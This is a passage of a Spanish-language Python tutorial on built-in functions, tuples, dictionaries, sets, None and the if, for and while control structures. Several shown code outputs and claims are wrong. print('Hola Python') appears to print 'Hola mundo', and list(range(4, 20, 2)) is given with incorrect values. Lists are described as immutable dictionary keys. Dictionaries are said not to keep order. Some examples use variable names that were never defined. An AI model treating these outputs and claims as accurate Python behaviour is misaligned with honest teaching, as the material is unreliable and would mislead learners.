whose nameor summary contain a given string such as  spam , type  modules spam . help&gt; lenHelp on built-in function len in module builtins:len(obj, /)  Return the number of items in a container. Como vemos despues de introducir la función len nos dice que es una función que nos retorna el numero de elementos que tiene un objeto que le proporcione como elemento. Continuando con otras funciones vamos a utilizar help ahora con print help(print)Help on built-in function print in module builtins:print(. . . )  print(value, . . . , sep=' ', end='\n', file=sys. stdout, flush=False)    Prints the values to a stream, or to sys. stdout by default.   Optional keyword arguments:  file: a file-like object (stream); defaults to the current sys. stdout.   sep:  string inserted between values, default a space.   end:  string appended after the last value, default a newline.   flush: whether to forcibly flush the stream. Probemos entonces. Aqui estariamos utilizando los valores por defecto. print( Hola Python )Hola mundoAhora tambien podemos pasarle dos valores, pueden ser de cualquier valor. print( Soy el numero , 1)Soy el numero 1Probemos ahora la opción sep que nos muestro al usar help. Lo que hara sera separarnos los valores por lo que introduzcamos en sep print( Soy el numero , 1, sep= : )Soy el numero:1Continuemos con otras funciones importantes que ya habiamos visto un poco antes. Concretamente seria int, str y float Vamos a definir primero una serie de variables. texto =  10  # esta variable es una stringnumero_int = 10 # esta variable corresponde a un intnumero_float = 10. 6 # esta variable es un floatSeguidamente vamos a probar estas funciones: Si usamos int en la variable de texto esta nos la devolvera como entero. int(texto)10Y si ahora usamos la función str sobre el entero, pues nos devolvera la variable transformada a string. str(numero_int)'10'Aplicando lo mismo con un float nos devolveria el resultado en flotante. float(numero_int)10. 0Otra de las funciones importantes es type que lo que hace es retornar el tipo del objeto que le proporcionamos como argumento. Veamosla a continuación: type(10)inttype( 10 )strtype(10. 5)floatPodriamos hacerlo para cualquier tipo de dato. lista = [1, 2, 3, 4]type(lista)listTenemos tambien a la función id que la vimos anteriormente. Y como mencioamos al pasarle un objeto nos dara como valor un numero asociado a la porción de memoria que este ocupa en la memoria. texto =  Hola Python id(texto)139906352396400Veamos ahora la función exec, que ejecuta el codigo que le pasemos como argumento en formato string. Definimos una variable que contiene una sentencia print. Que si la ejecutamos con exec nos va a relizar la ejecución de lo que contenia nuestra variable. variable =  print('Hola Python') exec(variable)Hola PythonTambien podemos tener funciones como round que sirve para redondear un valor, max y min para obtener el valor maximo y minimo y range para obtener un rango de numeros asociados. Lo recomendable es hechar un ojo a cada una de ellas para saber en que consiste cada una, pero cabe mencionar que la mayoria de ellas las veremos a lo largo del curso. Tuplas #Una tupla viene a ser un objeto identico a una lista excepto por dos propiedades:    Definen una colección ordenada de objetos, sin embargo utilizan () en la sintaxis (objeto1, objeto2, …, objetojn)     A diferencia que las lista, las tuplas son tipos de datos inmutables  La representación dentro de python con el tipo de dato tuple Veamoslo a continuación tupla = (1, 2, 3, 4, 5)type(tupla)tupleSe pueden aplicar todas las funciones que aplicabamos a las listas. print(tupla)(1, 2, 3, 4, 5)len(tupla)5Funcionamiento de las Tuplas: Podemos mezclar todo tipo de datos en una tupla, al igual que podemos usar conceptos como slide, stride y slicing tupla = (1, 2, 3,  texto1 ,  texto2 ,  texto3 )print(tupla)(1, 2, 3, 'text1', 'text2', 'text3')tupla[0:4](1, 2, 3, text1)Como mencionaba antes y hay que tenerlo muy presente es que las tuplas no pueden modificarse, ya que son inmutables y si tratamos de hacerlo python nos dara un error. tupla = (1, 2, 3,  texto1 ,  texto2 ,  texto3 )tupla[2] =  texto0 ---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-7-6b0bedb66139&gt; in &lt;module&gt;----&gt; 1 tupla[2] =  texto0 TypeError: 'tuple' object does not support item assignmentAhora seguro te preguntaras, si ya tenemos listas que son un objeto super potente en python y a diferencia de las tuplas, estas si podemos modificarlas. Entonces ¿Por que usaria una tupla? Pues esto lo veremos a continuación. Cuando utilizar una tupla en vez de una lista: Existen algunos casos donde es mas recomendable usar tuplas en lugar de lista.    Cuando se manipula una tupla, la ejecución del programa es mucho mas rapida. Esto cuando utilizamos una lista o tupla con muchos elementos.     El uso de una tupla protege contra una modificación accidental     Existe un tipo de dato llamado diccionario que lo veremos un poco mas adelante, que requiere como uno de sus componentes un valor inmutable. Por ello una tupla puede utilizarse para este proposito mientras que una lista no.     Podemos usar el empaquetado y desempaquetado que lo veremos un poquito mas adelante  Para cualquier otro caso de uso que no sean los que hago mención, es mucho mas recomendable el uso de una lista Tuplas y tipos de datos Numericos: Debemos de tener cuidado al momento que definimos una tupla con un único elemento de tipo numérico. Python puede llegar a interpretar los paréntesis como parte de la expresión matemática y definirlo como un tipo de dato numérico en lugar de una tupla. tupla = (4)tupla4type(tupla)intPara solucionar esto, podemos hacer uso de la sintaxis (numero,) tupla = (4,)tupla(4,)type(tupla)tuplePacking y Unpacking - Empaquetado y Desempaquetado: Anteriormente pudimos ver como una tupla con varios elementos puede asignarse a una unica variable. mitupla = (1, 2, 3, 4)No obstante, una tupla nos permite usar la estructura de empaquetado y desempaquetado. Esto quiere decir que podemos asignar los elementos de una tupla a distintas variables simultaneamente. mitupla = (1, 2, 3, 4)print(mitupla)(1, 2, 3, 4)numero1, numero2, numero3, numero4 = mituplaDe modo que si ahora yo muestro las variables, corresponderan a los que teniamos en la tupla. print(numero1)1print(numero2)2print(numero3)3print(numero4)4 Una cosa a tener en cuenta es que al realizar este proceso, el numero de variables que pongamos deben de coincidir con el numero de elementos de la tupla Ya que si asigno un valor menor o mayor, python me mostrara un error. numero1, numero2, numero3 = mitupla---------------------------------------------------------------------------ValueError                Traceback (most recent call last)Cell In[7], line 2   1 # El número de variables debe coincidir con el número de elementos de la tupla----&gt; 2 numero1, numero2, numero3 = tuplaValueError: too many values to unpack (expected 3)Este concepto de desempaquetado o Unpacking tambien nos permite devolver varios elementos en una función y asignarlos a varias variables. def funcion():  return 1,2func()(1, 2)numero1, numero2 = func()print(numero1)1print(numero2)2Otra cosa a mencioanr que es bastante interesante es que podemos definir una tupla sin usar (). Es algo muy raro de python que quiza pueda causar confusión, por ello recomiendo siempre mantener buenas practicas y usar () tupla = 1, 2, 3type(tupla)tupleDiccionarios #Los diccionarios son un tipo de dato complejo y particular en Python que corresponden con una colección de elementos clave-valor. Cada elemento clave-valor asocia la clave con un valor determinado. Para representar los diccionarios dentro de python lo hacemos con el tipo de dato dict. La sintaxis utilizada para definir diccionarios es la siguiente: {clave:valor1, clave2:valor2, . . . , claven:valorn} Como podemos observar a diferencias de las listas y las tuplas usamos las {} Veamos a continuación un ejemplo: diccionario = {   Nombre : firtsmiracle ,   Curso : Python ,   Idioma : Español ,   Nivel : Todos los Niveles }Como vemos los diccionarios nos permiten especificar un contexto sobre cada uno de los objetos, y de esta manera podemos tener una referencia de los objetos contenidos en la clave. Al imprimirlo tendriamos lo siguiente: print(diccionario){'Nombre': 'firtsmiracle', 'Curso': 'Python', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}y si le ahora usamos la función integrada type podemos ver que efectivamente nuestro dato corresponde a un diccionario type(diccionario)dictAhora tambien existe una forma de definir un diccionario, aunque es un poco inusual. Para ellos la sisntaxis que debemos usar es definir una variable y usaremos la función dict que recibira una serie de argumentos que seran la clave y el valor. Pero esta vez la clave no sera declarada como un string, sino como un argumento y la igualamos al valor que queremos que tenga. diccionario2 = dict(  Nombre= firtsmiracle ,  Curso= Python ,  Idioma=Español ,  Nivel= Todos los Niveles )Y si ahora sacamos este diccionario por pantalla, sera exactamente el mismo que definimos previamente. print(diccionario2){'Nombre': 'firtsmiracle', 'Curso': 'Python', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}Acceso a los Elementos de un Diccionario #: A diferencia de las tuplas y las listas, en los diccionarios no podemos acceder utilizando un indice. Los valores se acceden utilizando el nombre de las claves entre []. Vemoslo nuevamente en un ejemplo a continuación, para ello usaremos el diccionario que previamente habiamos definido. diccionario = {   Nombre : firtsmiracle ,   Curso : Python ,   Idioma : Español ,   Nivel : Todos los Niveles }Ahora supongamos que queremos acceder a la primera clave de mi diccionario. Lo que haria unicamente seria poner entre [] el nombre de la clave. diccionario['Nombre']'firtsmiracle'Lo mismo si quisieramos acceder a otra clave. diccionario['Curso']'Python'Sim embargo como antes mencionamos, que si queremos hacer lo mismo pero usando un indice, python nos dara un error, ya que nuevamente debemos recalcar que unicamente podemos acceder usando el nombre de las claves. diccionario[0]---------------------------------------------------------------------------KeyError                 Traceback (most recent call last)&lt;ipython-input-10-d5a2f4e83513&gt; in &lt;module&gt;----&gt; 1 diccionario[0]KeyError: 0Otra cosa muy importante a tener en cuenta es que podemos usar cualquier objeto inmutable como clave de un diccionario. Estos incluyen a las listas, numeros, tuplas, strings entre otros. diccionario2 = {  0:  numero cero ,  1:  numero uno ,  2:  numero dos ,  3:  numero tres }Si ahora queremos acceder a uno de los valores tenemos que hacerlo a traves de su clave, que en este caso corresponde a un objeto inmutable que es un numero. Entonces debemos acceder de la siguiente forma: diccionario2[0]'numero cero'Lo mismo podriamos hacerlo pero esta vez usando un tupla. diccionario3 = {  ( numero , 1):  primer numero ,  ( numero , 2):  segundo numero ,  ( numero , 3):  tercer numero }Vemos que esta vez como clave usamos una tupla, y si queremos acceder a uno de los elementos pues debemos hacerlo a traves de la tupla. Raro pero podemos hacerlo. diccionario3[( numero , 1)]'primer numero'Elementos de un Diccionario #: Los diccionarios son objetos que pueden modificarse y no se respeta el orden de los elementos, por este motivo es que accedemos a traves de una clave y no mediante un indice. Veamoslo a continuación de manera practica: Primero definamos nuestro diccionario, usaremos el que ya teniamos para efectos practicos. diccionario = {   Nombre : firtsmiracle ,   Curso : Python ,   Idioma : Español ,   Nivel : Todos los Niveles }Ahora para poder modificar un elemento, debemos usar la clave que deseamos cambiar, de la misma manera que lo haciamos con los indices. Para este caso en concreto modificaremos las claves Nombre y Curso. diccionario[ Nombre ] =  Milagro diccionario[ Curso ] =  Bash print(diccionario){'Nombre': 'Milagro', 'Apellido': 'Bash', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}Una cosa interesante que debemos tener en cuenta sobre los diccionarios es que podemos añadir nuevos elementos en la estructura cuando lo necesitemos. De la misma manera qu accediamos a las claves para poder modificarlas, tambien podemos hacer el proceso similar para añadir elementos, solo que en este caso al no existir la clave en el diccionario este nos la crea en conjunto con su contenido. print(diccionario){'Nombre': 'Milagro', 'Curso': 'Bash', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}diccionario[ Duración ] =  Constantemente print(diccionario){'Nombre': 'Milagro', 'Apellido': 'Bash', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles', 'Duración':  Constantemente }Hay que tener en cuenta que los diccionarios nos permiten asignar diferente tipos de datos. Esto incluye strings, listas, tuplas y exacto tambien diccionarios. Esto quiere decir que podemos insetar un diccionario dentro de otro. diccionario = {   int :20,   str : Hola Python ,   lista :[1, 2, 3, 4],   tupla :(1, 2, 3, 4),   dict :{ num1 : numero1 ,  num2 : numero2 }}Si ahora probamos a acceder a algunos elementos. diccionario[ tupla ](1, 2, 3, 4)diccionario[ dict ]{'num1': 'numero1', 'num2': 'numero2'} Una cosa a tener en cuenta es que las claves no tiene que ser el mismo tipo de dato. Me refiero a que podemos definir una clave como int y asignarle un string, como vemos a continación. diccionario = {  1: Este es mi primer numero ,   dos : Este es mi segundo numero ,  ( tres ,): Este es mi tercer numero }Si ahora deseamos mostrarlos por pantalla. diccionario[1]'Este es mi primer numero'diccionario[ dos ]'Este es mi segundo numero'diccionario[( tres ,)]'Este es mi tercer numero' Otro punto a tener en cuenta es que la restricción cuando utilizamos diccionarios, es que no puede haber dos claves con el mismo nombre. diccionario = {   nombre : firtsmiracle ,   nombre : firtsmiracle2 }En este caso estamos usando como clave dos veces a nombre y debido a esto lo que sucede es que si mostramos por pantalla nuestro diccionario unicamente nos mostrara la clave final que nombramos y no nos mostrara la primera o las anteriores creadas ya que sobrescribe la clave. diccionario{'nombre': 'firtsmiracle2'}Operaciones con Diccionarios #: Al igual que hacemos con las listas y los demas de tipos de datos complejos, podemos utilizar algunos de los operadores presentados en los temas anterior con los diccionarios. diccionario1 = {   clave1 :  valor1 ,   clave2 :  valor2 }diccionario2 = {   clave3 :  valor3 ,   clave4 :  valor4 }Podemos aplicar algunos operaciones como las de identidad. diccionario1 is diccionario2Falsediccionario1 == diccionario2FalsePero en el caso de operadores aritmeticos, estos no podemos usarlos ya que nos da un error. diccionario1 + diccionario2---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-51-9a6dceb2d25d&gt; in &lt;module&gt;----&gt; 1 diccionario1 + diccionario2TypeError: unsupported operand type(s) for +: 'dict' and 'dict'Sets #: Los sets son un tipo de datos que nos permite almacenar múltiples elementos en una misma variable. A diferencia de las listas, la colección de elementos que forman un set:  No se pueden indexar No respetan un orden No pueden contener valores duplicadosLos sets se representan con el tipo de dato set. La sintaxis que se utiliza para definir un set en Python es: {valor1, valor2, …, valorn}. Vamos a definir un set a continuación para poder entenderlo de una mejor manera. lenguajes = { python ,  rust ,  javascript }print(lenguajes){'python', 'rust', 'javascript'}type(lenguajes)setFuncionamiento de un set #: Debido a sus caracteristicas, suele utilizarse para casos de uso muy específicos, como eliminar elementos duplicados de una lista o implementar algunas operaciones matemáticas como la intersección de dos conjuntos. lenguajes = { python ,  rust ,  javascript }miset[0]---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-7-97dccbd19ab1&gt; in &lt;module&gt;   1 # Los elementos de un set no se pueden indexar----&gt; 2 lenguajes[0]TypeError: 'set' object is not subscriptableComo observamos si tratamos de indexar, no nos es posible. La pregunta seria entonces si no podemos ingresar a sus elementos para que nos sirve?. Pues una de ellas seria que si tenemos la necesidad de eliminar elementos repetidos de una lista que en muchos casos nos va a pasar, podemos hacerlo haciendo uso de la función set() y con ella quitamos todos los elementos duplicados. lenguajes = [ python ,  rust ,  javascript ,  python ,  php ,  nodejs ,  javascript ,  python ,  C ,  php ]set(lenguajes){'python', 'rust', 'javascript', 'php', 'nodejs', 'C'}Ahora podemos ver que tenemos que eliminamos los elementos repetidos, pero ahora diras, perfecto se elimino pero ahora tengo un set y yo quiero una lista. Pues podemos utilizar el mismo concepto para convertir el resultado de nuestro set a una lista, haciendo uso de la función list. lenguajes = [ python ,  rust ,  javascript ,  python ,  php ,  nodejs ,  javascript ,  python ,  C ,  php ]lenguajesUnicos = list(set(lenguajes))print(lenguajesUnicos)['python', 'rust', 'javascript', 'php', 'nodejs', 'C']Frozenset #: Es igual que un set, pero con la diferencia de que este es inmutable. No es un tipo de dato relevante, pero no esta de mas mencionarlo. frozset = frozenset({ python, php, javascript })print(frozset)frozenset({'python, php, javascript'})type(frozset)frozensetNoneType #: La palabra clave None es un objeto de la clase NoneType que se utiliza para definir una variable nula o un objeto vacío. Podemos asignar None a cualquier variable, pero no se podemos crear objetos NoneType. variable = Noneprint(variable)Nonetype(None)NoneTypeUsamos este tipo de dato cuando no queremos retornar nada o cuando tenemos una variable a la que no asignesmos ningun valor, nos encontraremos muchas vences con este tipo de dato. Funcionamiento #: Debemos tener en cuanto algunas cosas importantes sobre None, las cuales son:  None no es igual que False None no es 0 None no es un string vacío Cuando comparamos None con cualquier cosa devuelve False excepto con Nonevariable = Nonevariable is NoneTruevariable == NoneTruevariable is FalseFalsevariable is TrueFalsevariable == FalseFalsevariable == 0Falsevariable ==   FalseComo podemos ver si comparamos el None con cero o una cadena vacia nos devuelve False, puesto que no es lo mismo y de igual manera si comparamos con cualquier otra cosa nos devolvera False. El unico caso en el que nos devuelve True es cuando lo comparamos con el propio None. Estructuras de Control de Flujo #: Todo lo que hemos visto hasta el momento han sido elementos que se ejecutan de manera secuencial y en el orden especificado. Sin embargo, cuando estamos programando con frecuencia se necesita cambiar el control del flujo de ejecución de las sentencias y realizar acciones como: saltarse alguna sentencia, ejecutar una serie de sentencias muchas veces repetidamente, o elegir entre conjuntos alternativos de sentencias a ejecutar. Justo aqui es donde entran en juego las estructuras de control de flujo, ya que nos permiten modificar el flujo de ejecución de un programa. Sentencia If, elif y else # {#sentencia-if,-elif-y-else}: Sentencia If #: La sentencia if es una de las estructuras más importantes de cualquier lenguaje de programación. Esta estructura nos permite implementar sentencias condicionales dentro de nuestro programa. La sintaxis utilizada para definir la sentencia if es la siguiente: if expresión:  sentencia(s)expresión: Se evalua en un contexto booleano, cuyo resultado debe devolver True o False. sentencia(s): Es el bloque de sentencias que se ejecutarán cuando el resultado de evaluar la expresión sea True, en caso contrario se omite. Veamos a continuación un caso practico para entenderlo mejor. Primero definamos dos variables y les asignaremos valores numericos. numero1 = 5numero2 = 10Seguidamente vamos a definir una expresión que en este caso al cumplirse nos devolvera True numero1 &lt; numero2TrueAhora vamos a usar la sentencia if con la expresión antes creada. Donde al cumplirse la expresión nos imprima por pantalla dos cadenas de texto. if numero1 &lt; numero2:  print( Primera sentencia )  print( Segunda sentencia )Primera sentenciaSegunda sentenciaEfectivamente ya que el numero1 es mayor al numero2, nos valida como True la condición y nos mostrara las cadenas en pantalla. Pero si ahora modificamos el valor de la variable numero1 y volvemos a validar la expresión usando la sentencia if, no nos imprimira las cadenas puesto que ahora la condición no se cumple. numero1 = 15if numero1 &lt; numero2:   print( Primera sentencia )  print( Segunda sentencia ) Algo muy importante! es que en Python todo el codigo que sea local a una estructura,ya sea una función o una estructura de control como if, debe esta “identado”, es decir, respetar la sangría. Una de las cosas super interesantes de esta sentencia de control de flujo es que podemos utilizar casi cualquier tipo de operador, tipo de dato y expresión siempre y cuando el resultado sea un valor booleano True o False. En este caso usaremos una lista para ejecutar la sentencia. listaAlumnos = [ juan ,  pablo ,  lucas ]if  juan  in listaAlumnos:  print( El alumno se encuentra en la lista )El alumno se encuentra en la listaPodriamos hacer lo mismo, pero esta vez a partir de una tupla. Numeros = (1, 2, 4, 5, 6, 7, 8)if 4 in Numeros:  print( El numero se encuentra en la tupla )El numero se encuentra en la tuplaClausula Else #: Hay ocasiones donde nos encontraremos con casos en los que quedremos que una estructura ejecute unas sentencias si la expresión es True pero además, que ejecute otras sentencias distintas si la expresión es False. Para este tipo de casos se utiliza la cláusula else. La sintaxis que debemos utilizar es la siguiente: if &lt;expresión&gt;:  &lt;sentencia(s)&gt;else:  &lt;sentencia(s)&gt;A continuación vamos a mostrarlo en un ejemplo: numero1 = 4numero2 = 8if numero1 &lt; numero2:  print( Ejecuta la sentencia si es True )else:  print( Ejecuta la sentencia si es False )Ejecuta la sentencia si es TrueComo vemos al cumplirse la condición, nos imprime el print dentro del if, pero si ahora modificamos la condición en sentido contrario, esta al no cumplirse nos devolvera un False y por lo tanto se ejecutara la condición definida en el else. numero1 = 4numero2 = 8if numero1 &gt; numero2:  print( Ejecuta la sentencia si es True )else:  print( Ejecuta la sentencia si es False )Ejecuta la sentencia si es FalseClausula Elif #: Ahora que pasaria si queremos implementar una estructura condicional que requiera múltiples evaluaciones de varias expresiones para tomar la decisión de qué código ejecutar. Para estos casos específicos podemos utilizar la cláusula elif. La sintaxis que debemos utilizar para definir la cláusula elif dentro de una estructura if es esta: if &lt;expresión&gt;:  &lt;sentencia(s)&gt;elif &lt;expresión&gt;:  &lt;sentencia(s)&gt;elif &lt;expresión&gt;:  &lt;sentencia(s). . . else:  &lt;sentencia(s)&gt;Veamos en un caso practico a continuación. alumnos = [ Peter ,  Pablo ,  Juan ,  Scarlet ]if  Pedro  in alumnos:  print( Hola alumno Pedro )elif  Nicolas  in alumnos:  print( Hola alumno Nicolas )elif  Maria  in alumnos:  print( Hola alumna Maria )elif  Scarlet  in alumnos:  print( Hola Scarlet )else:  print( El alumno no se encuentra en la lista )Hola ScarletComo vemos en nuestro programa, definimos una lista de alumnos y realizamos multiples evaluaciones con el uso de elif, de modo que el programa recorrera cada una de estas hasta que alguna se cumpla y nos devolvera el resultado de validar esa condición. Sentencia if en una linea #: Python nos permite utilizar una sintaxis específica para implementar sentencias if en una sola línea de código. Sin embargo, el uso de esta opción no es tan recomendable debido a que puede aumentar la complejidad en la lectura del código. Para ello solo debemos establecer una condición y seguidamente debemos separar cada sentencia que queremos ejecutar con ;. if 20 &gt; 10: print( Primera sentencia );print( Segunda sentencia )Primera sentencia Segunda sentenciaOperador Condicional #: Python tambien soporta una construcción más relacionada con la sentencia if que puede resultarnos muy interesante para determinados casos. A esta construcción se le denomina operador condicional. La sintaxis es la siguiente: &lt;expresión1&gt; if &lt;expresión_condicional&gt; else &lt;expresión2&gt;Esto nos permite simplificar el código que utilizamos para determinadas tareas como, asignar un valor a una variable en función de una condición o imprimir valores por pantalla. Viendolo de manera practica. Supongamos queremos asignar un valor en función al nombre que nos de el usuario, para ello podriamos crear un codigo que nos lo realize pero este tendria varias lineas. nombre =  Juan if nombre ==  Juan : edad = 18else: edad = 10print(edad)18Pero si usamos el operador condicional, podriamos simplificar todas esas lineas de codigo y ejecutarla en una sola. nombre =  Juan edad = 18 if nombre ==  Juan  else 10print(edad)18Como vemos en ambos casos obtenemos el mismo resultado, pero haciendo uso de este operador optimizamos nuestro codigo de tal modo que podemos simplicarlo, y esto nos resulta muy conveniente. De la misma manera podemos usar este operador para en vez de asignar, mostrar resultados por pantalla. dia= sabado print( Voy a estudiar python  if dia== sabado  else  tengo que trabajar )Voy a estudiar pythonEsto es muy genial, ya que podemos tener mas simplificado y elegante nuestro codigo, y es bastante utilizado. Sentencia For #: La sentencia de control de flujo for es otra de las estructuras fundamentales en python, que nos permite implementar sentencias en Python que se repitan un número finito de veces. Por esta razón a este tipo de sentencias se les denomina bucles. Existen circunstancias en las que nosotros queramos repetir las sentencias de nuestro codigo de manera repetitiva, a eso le denominamos bucle. La sentencia de control de flujo for es otra de las estructuras fundamentales de cualquier lenguaje de programación, incluido Python. Esta estructura nos permite implementar sentencias en Python que se repitan un número finito de veces. Por esta razón a este tipo de sentencias se les denomina bucles. La sintaxis utilizada para definir la sentencia for es la siguiente: for &lt;variable&gt; in &lt;iterable&gt;:  &lt;sentencia(s)&gt;&lt;iterable&gt; Se refiere a una colección de elementos, por ejemplo, una lista o una tupla. &lt;variable&gt; Recibirá uno de los elementos del objeto &lt;iterable&gt; en cada una de las itreaciones. &lt;sentencia(s)&gt; Bloque de sentencias en Python que se ejecutará repetidamente. Para entenderlo mejor veamos un ejemplo a continuación: Comenzaremos creandonos una lista. cursos = [ python ,  sql ,  javascript ,  node ]Ahora lo siguiente que haremos sera imprimir cada uno de los valores de nuestra lista por pantalla, sin necesidad de ejecutar la sentencia print varias veces. Para ello lo que tenemos que hacer es utilizar la sentencia for y seguidamente tengo que definir una variable que ira recibiendo cada uno de los valores de la lista, puede ser el nombre que quieras, pero se recomienda ser lo mas descriptivo posible. En este caso pondre de nombre a la variable curso, despues usaremos la palabra reservada in y especcifiaremos nuestro objeto iterable que seria la lista cursos y :. Finalemente imprimimos la variable que recibe cada elemento por cada iteración. for curso in cursos:  print(curso)pythonsqljavascriptnodeComo vemos como resultado nos muestra el valor de cada iteración de nuestro codigo. Objetos Iterables #: Para que nos quede claro en su totalidad el concepto de los bucles, es bueno que nos quede claro que son los objetos iterables. Los iterables, son objetos que pueden utilizarse para realizar iteraciones. Si un objeto es iterable, podemos pasarlo como argumento a la función por defecto iter() y nos devolverá un iterador. Por ejemplo si le pasamos una cadena de texto, como resultado nos devuelve un iterador. iter( Curso de Python )&lt;str_iterator at 0x1b7e7ca8240&gt;Podriamos aplicar lo mismo a una lista o con un diccionario. iter([10, 20, 30, 40])&lt;list_iterator at 0x1b7e7bcf1b0&gt;iter({'curso':  python , 'profesor':  firtsmiracle })&lt;dict_keyiterator at 0x1b5e7cbd530&gt;pero si nosotros le pasamos un objeto no iterable, nos dara un error. iter(8)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-6-e50867f8c07e&gt; in &lt;module&gt;----&gt; 1 iter(8)TypeError: 'int' object is not iterableNext #: La función next() nos va a devolver valores uno a uno cuando la apliquemos en un iterador. Para ello guardamos el iterador de la lista en una variable cursos_itr, de otro modo si aplicamos el next en la lista misma nos dara un error. cursos = [ python ,  sql ,  javascript ,  node ]cursos_itr = iter(curso)type(cursos_itr)list_iteratornext(lista_itr)'python'next(lista_itr)'sql'Debemos de tener en cuenta tambien que cuando no quedan elementos a devolver en nuestro iterador, se emite una exepción: next(cursos_itr)---------------------------------------------------------------------------StopIteration               Traceback (most recent call last)&lt;ipython-input-14-0461955db405&gt; in &lt;module&gt;----&gt; 1 next(cursos_itr)StopIteration: Uso de else en un bucle For #: Un bucle for también puede tener una cláusula else que se ejecutará cuando el iterador emita una excepción cuando no queden más elementos. Vamos a verlo de manera practica: Comenzemos creando una variable nomnbre que con la ayuda de la sentencia for va a iterar en los datos de nuestra lista que vamos a imprimir, despues de usaremos la sentencia else, que se ejecutara cuando el bucle finalize. for nombre in [ Juan ,  Roberto ,  Carlos ]:  print(nombre)else:  print( El bucle ya no tiene mas personas )JuanRobertoCarlosEl bucle ya no tiene mas personasComo resultado podemos ver que nuestro codigo nos mostro en pantalla, todos los valores del bucle y una vez que no habia mas valores por iterar nos ejecuto la sentencia else con el mensaje que establecimos. Range #: Finalizando con la sección sobre la sentencia for, es necesario mostrar una función que viene por defecto en Python y que se utiliza muy frecuentemente en conjunto con los bucles, y esta es la función range(). Esta sentencia nos va a retornar un objeto que produce una secuencia de enteros, desde un numero de inicio a un numero final que especifiquemos. Si le pasamos un numero entero, nos devuelve un objeto que empieza en 0 y termina en 10 range(10)range(0, 10)y si ahora aplicamos la función list a la previa función range que creamos nos da como resultado una lista con valores que van desde 0 a 9 list(range(10))[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]Cabe recalcar que segun el numero o rango que especifiquemos, al ejecutarse desde el indice 0 restara un valor al numero o rango que establezcamos. Por ejemplo si ahora establecemos un rango: list(range(10, 20))[10, 11, 12, 13, 14, 15, 16, 17, 18, 19]Como resultado obtenemos que nuestra lista inicia desde el valor inicial que especificamos en nuestro rango 10 y termina hasta llegar al numero 19. Cumpliendose nuevamente lo antes mencionado que es restarle el ultimo valor final 20. Otra cosa muy intersante es que la función range() también admite aplicar el concepto de stride. list(range(4, 20, 2))[4, 6, 8, 10, 12, 14, 15, 17, 18]Como vemos ademas de establecer el rango, con el concepto de stride, tambien podemos especificar un numero de saltos, en este caso de 2. Por lo tanto nuestra lista nos imprimira los valores del rango de dos en dos.  Cabe recalcar que el potencial de esta función no es utilizarla con la función list(), ya que consume muchos recursos computacionales, mas bien debemos combinarla con estructura de control de flujo como el bucle for. for numero in range(8):  print(numero)01234567Del mismo modo podemos establecer rango en nuestra sentencia Fory esta de mas mencionar que tambien podriamos usar el concepto de stride. for numero in range(10, 20):  print(numero)10111213141516171819Sentencia While #: La sentencia de control de flujo while es otra de las estructuras fundamentales de Python. Esta estructura nos permite implementar sentencias que se repitan un número infinito de veces a diferencia de for que era un numero finito. La sintaxis utilizada para definir la sentencia while es la siguiente: while &lt;expresión&gt;:  &lt;sentencia(s)&gt;&lt;sentencia(s)&gt; es el bloque de sentencias que se van a ejecutar de manera indefinida hasta que no se cumpla la expresión. &lt;expresión&gt; es una expresión evaluada en un contexto booleano True o False que controla la ejecución del bucle while. Para comprenderlo mejor veamoslo de manera practica. Definimos una variable numero=1. Usamos la sentencia while y definimos una expresión en la cual mientras que numero &lt; 10se ejecutara nuestra sentencia que seria sumar en una unidad a la variable numero. numero = 1while numero &lt; 10:  numero += 1  print(numero)2345678910Obtendremos como resultado en pantalla el valor de cada iteración hasta que deje de cumplirse la condición ya que cuando eso pase nuestro bucle finalizara. Probemos un ejemplo un poco mas complejo. Declaramos una lista con nombres y un indice que igualamos a 0. Establecemos la condición que mientras el indice sea menor a la longitud de nuestra lista nombres, nos imprima el indice de la lista que corresponda por cada iteración y a su vez tenemos que por incrementar el valor de nuestra varaible indice en una unidad cada vez que se itere, de otro modo siempre se cumpliria la codición y esta se haria infinita. nombres = [ juan ,  pedro ,  carlos ]indice = 0while indice &lt; len(nombres):  print(nombres[indice],  esta en la lista )  indice += 1else:   print( no hay mas nombres )juan esta en la listapedro esta en la listacarlos esta en la listano hay mas nombresComo resultado de lo ya aprendido, podemos ver que se ejecuto las sentencias definidas y cuando ya no se cumple la condición, se imprime lo establecido en el else. Uso de else en un bucle While #: Al igual que con el bucle for, la sentencia while también permite el uso de una claúsula else y funciona de la misma manera. Definimos una variable y establecemos una condición que va iterar mientras se cumpla, y una vez termine imprimira el codigo de la sentencia else. numero = 4while numero &gt; 0:  numero -= 1  print(numero)else:  print( Se finalizo la iteración del bucle )3210Se finalizo la iteración del bucleBucles Infinitos #: Una de las características importantes de los bucles while es que pueden ejecutarse de manera infinita. Si no se realiza un control adecuado de la expresión que se evalúa, el bucle puede ejecutarse de manera indefinida hasta que se consuman los recursos de nuestro sistema. Similar a cuando haciamos el ejercicio practico previamente de los nombres, debemos tener cuidado al momento de establecer nuestra condición while y realizar un control adecuado en nuestras sentencias. numero = 10while numero &gt; 0:  print( Imprimir el numero , numero)Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Imprimir el numero 10Como podemos observar declaramos una variable numero=10, seguidamente establecemos la condición que mientras el numero sea mayor a 0 se ejecute nuestro print. Y debido a que no estamos estableciendo una control ya que la condición 10 &gt; 0 siempre se va a cumplir, causara que se imprima el mensaje infinitamente hata lograr consumir todos los recursos de nuestro sistema. Por ello hay que tener bastante cuidado en ese aspecto y establecer un control, que en este caso seria que una vez se cumpla la condición y se imprima el mensaje a nuestra variable numero restarle una unidad. 